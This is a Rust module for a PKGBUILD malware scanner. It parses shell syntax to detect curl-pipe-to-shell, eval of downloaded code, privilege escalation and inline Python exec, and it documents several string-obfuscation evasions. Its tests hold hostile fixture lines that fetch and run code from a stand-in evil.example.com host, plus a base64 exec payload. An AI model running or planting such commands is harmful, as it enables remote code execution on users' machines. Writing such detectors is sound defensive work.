//! AST-based structural checks for the PKGBUILD scanner, on top of
//! tree-sitter-bash.
//!
//! The line-based heuristics in `security.rs` are a cheap first pass, but
//! they're pure text matching and can be evaded by anything that doesn't
//! literally contain the substring being grepped for:
//!   - `curl ... | s""h` (bash string concatenation — evaluates to `sh` at
//!     runtime, but no line contains the literal text "sh" after the pipe)
//!   - `curl ... | /bin/sh` (absolute path instead of a bare shell name —
//!     fixed on the line-based side too, but the AST handles it for free)
//!   - `# sudo ./validator` or `makedepends=('sudo')` (both need their own
//!     explicit "am I a comment / am I inside an array literal" carve-out
//!     in a line-based check; here they're structurally not a `command`
//!     node at all, so no carve-out is needed)
//!
//! Each function here parses the source with tree-sitter-bash and walks
//! the real syntax tree. They return `None` both on "didn't find it" and
//! on "couldn't parse it" — callers in `security.rs` fall back to the
//! corresponding line-based heuristic in that case (`.or_else(...)`), so a
//! parse failure never silently drops a check, it just loses the extra
//! precision for that one file.
//!
//! Command names are only ever matched when they're statically known
//! (`resolve_word` bails to `None` on anything containing an unresolved
//! `$expansion` or `$(command_substitution)`) — a command invoked through
//! a variable (`$RUNNER ./validator`) is a real blind spot here, same as
//! it would be for any static analysis, and isn't claimed to be covered.

use tree_sitter::Node;

fn parse(source: &str) -> Option<tree_sitter::Tree> {
    let mut parser = tree_sitter::Parser::new();
    parser.set_language(tree_sitter_bash::language()).ok()?;
    parser.parse(source, None)
}

fn find_descendants<'a>(node: Node<'a>, kind: &str, out: &mut Vec<Node<'a>>) {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == kind {
            out.push(child);
        }
        find_descendants(child, kind, out);
    }
}

/// Resolves a `word` / `raw_string` ('...') / `string` ("...") /
/// `concatenation` node to a literal string. Returns `None` if the value
/// depends on anything dynamic (an `expansion` or `command_substitution`
/// inside a double-quoted string) — we never guess at a value we can't
/// actually determine statically.
fn resolve_word(node: Node, src: &[u8]) -> Option<String> {
    match node.kind() {
        "word" => Some(node.utf8_text(src).ok()?.to_string()),
        "raw_string" => Some(node.utf8_text(src).ok()?.trim_matches('\'').to_string()),
        "string" => {
            let mut out = String::new();
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                match child.kind() {
                    "\"" => {}
                    "string_content" => out.push_str(child.utf8_text(src).ok()?),
                    _ => return None, // expansion/command_substitution inside
                }
            }
            Some(out)
        }
        "concatenation" => {
            let mut out = String::new();
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                out.push_str(&resolve_word(child, src)?);
            }
            Some(out)
        }
        _ => None,
    }
}

/// Statically-known command name of a `command` node (lowercased), or
/// `None` if it's built from an unresolved expansion.
fn command_name_of(command_node: Node, src: &[u8]) -> Option<String> {
    let mut cursor = command_node.walk();
    let name_node = command_node.children(&mut cursor).find(|c| c.kind() == "command_name")?;
    let mut c2 = name_node.walk();
    let first_child = name_node.children(&mut c2).next()?;
    resolve_word(first_child, src).map(|s| s.to_lowercase())
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn line_of(node: Node) -> usize {
    node.start_position().row + 1
}

const SHELL_NAMES: &[&str] = &["sh", "bash", "zsh", "dash", "ash"];
const FETCHERS: &[&str] = &["curl", "wget"];
const ESCALATORS: &[&str] = &["sudo", "pkexec", "doas"];

/// Structural equivalent of `curl_pipe_shell_line`: a `pipeline` node
/// where some earlier command resolves to curl/wget and the last command
/// resolves to a shell — survives quoting (`| "sh"`, `| 'sh'`),
/// concatenation (`| s""h`), absolute paths (`| /bin/sh`), and `env`
/// wrappers (`| env bash`, `| env -S sh`) uniformly, instead of needing a
/// separate carve-out for each.
pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut pipelines = Vec::new();
    find_descendants(tree.root_node(), "pipeline", &mut pipelines);
    for pipeline in pipelines {
        let mut cursor = pipeline.walk();
        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
        if commands.len() < 2 {
            continue;
        }
        let has_fetcher = commands[..commands.len() - 1]
            .iter()
            .any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str())));
        if !has_fetcher {
            continue;
        }
        let last = commands[commands.len() - 1];
        if let Some(name) = command_name_of(last, src) {
            // `env sh` / `env -S bash`: the real interpreter is the first
            // non-flag argument to env, not "env" itself.
            let effective = if name == "env" {
                let mut c3 = last.walk();
                let arg_words: Vec<Node> = last.children(&mut c3).filter(|c| c.kind() == "word").collect();
                arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
            } else {
                Some(name)
            };
            if let Some(eff) = effective {
                if SHELL_NAMES.contains(&basename(&eff)) {
                    return Some(line_of(pipeline));
                }
            }
        }
    }
    None
}

/// Structural equivalent of `eval_remote_exec_line`: an `eval` command
/// whose arguments contain a `command_substitution` that itself contains
/// a curl/wget command anywhere inside it, however it's nested (piped,
/// wrapped, etc.) — not just "the line contains `$(` and `curl`".
pub(crate) fn eval_remote_exec(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in &commands {
        let Some(name) = command_name_of(*cmd, src) else { continue };
        if name != "eval" {
            continue;
        }
        let mut substs = Vec::new();
        find_descendants(*cmd, "command_substitution", &mut substs);
        for subst in substs {
            let mut inner = Vec::new();
            find_descendants(subst, "command", &mut inner);
            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
                return Some(line_of(*cmd));
            }
        }
    }
    None
}

/// Structural equivalent of `sudo_escalation_line`: an actual `command`
/// node whose name is sudo/pkexec/doas. Comments and array literals
/// (`makedepends=('sudo')`) are structurally not `command` nodes at all,
/// so they're excluded for free instead of needing their own check.
pub(crate) fn sudo_escalation(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in commands {
        if let Some(name) = command_name_of(cmd, src) {
            if ESCALATORS.contains(&name.as_str()) {
                return Some(line_of(cmd));
            }
        }
    }
    None
}

/// Structural equivalent of `python_inline_exec_line`: a python/python3
/// command invoked with `-c` whose argument string statically resolves
/// and contains `exec(`/`eval(`/`os.system(`/`subprocess.`/`os.popen(`.
pub(crate) fn python_inline_exec(source: &str) -> Option<usize> {
    let tree = parse(source)?;
    let src = source.as_bytes();
    let mut commands = Vec::new();
    find_descendants(tree.root_node(), "command", &mut commands);
    for cmd in commands {
        let Some(name) = command_name_of(cmd, src) else { continue };
        if !["python", "python2", "python3"].contains(&name.as_str()) {
            continue;
        }
        let mut cursor = cmd.walk();
        let args: Vec<Node> = cmd.children(&mut cursor).collect();
        let has_dash_c = args.iter().any(|a| a.kind() == "word" && a.utf8_text(src) == Ok("-c"));
        if !has_dash_c {
            continue;
        }
        for a in &args {
            if matches!(a.kind(), "string" | "raw_string") {
                if let Some(text) = resolve_word(*a, src) {
                    let lower = text.to_lowercase();
                    if ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("].iter().any(|p| lower.contains(p)) {
                        return Some(line_of(cmd));
                    }
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod ast_tests {
    use super::*;

    #[test]
    fn curl_pipe_shell_evasions_caught() {
        assert_eq!(curl_pipe_shell("curl -sSL https://x | sh"), Some(1));
        assert_eq!(curl_pipe_shell("wget -O- https://x | /bin/sh"), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | env bash"), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | \"sh\""), Some(1));
        assert_eq!(curl_pipe_shell("curl -sSL https://x | 'sh'"), Some(1));
        // bash string-concatenation evasion: literally "s" + "" + "h"
        assert_eq!(curl_pipe_shell("curl -sSL https://x | s\"\"h"), Some(1));
    }

    #[test]
    fn curl_pipe_shell_clean_cases_not_flagged() {
        assert_eq!(curl_pipe_shell("curl -sSL https://x -o file.tar.gz"), None);
        assert_eq!(curl_pipe_shell("curl -sSL https://x | tee log.txt"), None);
        assert_eq!(curl_pipe_shell("# curl -sSL https://x | sh"), None);
    }

    #[test]
    fn eval_remote_exec_caught_and_not_false_positive() {
        assert_eq!(eval_remote_exec("eval \"$(curl -sSL https://x)\""), Some(1));
        assert_eq!(eval_remote_exec("eval `wget -qO- https://x`"), Some(1));
        assert_eq!(eval_remote_exec("eval \"${some_array[@]}\""), None);
        assert_eq!(eval_remote_exec("# eval \"$(curl https://x)\""), None);
    }

    #[test]
    fn sudo_escalation_caught_and_not_false_positive() {
        assert_eq!(sudo_escalation("sudo ./validator --init"), Some(1));
        assert_eq!(sudo_escalation("pkexec /tmp/helper"), Some(1));
        assert_eq!(sudo_escalation("doas sh -c id"), Some(1));
        // must NOT flag: not a command, just an array element / comment
        assert_eq!(sudo_escalation("makedepends=('sudo')"), None);
        assert_eq!(sudo_escalation("depends=('sudo' 'other')"), None);
        assert_eq!(sudo_escalation("# sudo ./validator"), None);
    }

    #[test]
    fn python_inline_exec_caught_and_not_false_positive() {
        assert_eq!(
            python_inline_exec("python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""),
            Some(1)
        );
        assert_eq!(python_inline_exec("python -c 'os.system(\"id\")'"), Some(1));
        assert_eq!(python_inline_exec("python3 -c 'print(1+1)'"), None);
        assert_eq!(python_inline_exec("python3 setup.py build"), None);
    }

    #[test]
    fn finds_findings_nested_inside_build_function() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
build() {
  cd "$srcdir"
  sudo ./validator --setup
  curl -sSL https://evil.example.com/x | /bin/sh
  eval "$(wget -qO- https://evil.example.com/y)"
}
"#;
        assert_eq!(sudo_escalation(pkgbuild), Some(6));
        assert_eq!(curl_pipe_shell(pkgbuild), Some(7));
        assert_eq!(eval_remote_exec(pkgbuild), Some(8));
    }

    #[test]
    fn clean_pkgbuild_hits_nothing() {
        let clean = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert_eq!(sudo_escalation(clean), None);
        assert_eq!(curl_pipe_shell(clean), None);
        assert_eq!(eval_remote_exec(clean), None);
        assert_eq!(python_inline_exec(clean), None);
    }

    #[test]
    fn unparseable_input_falls_back_to_none_not_panic() {
        assert_eq!(curl_pipe_shell("{{{ not bash at all ]]]"), None);
    }
}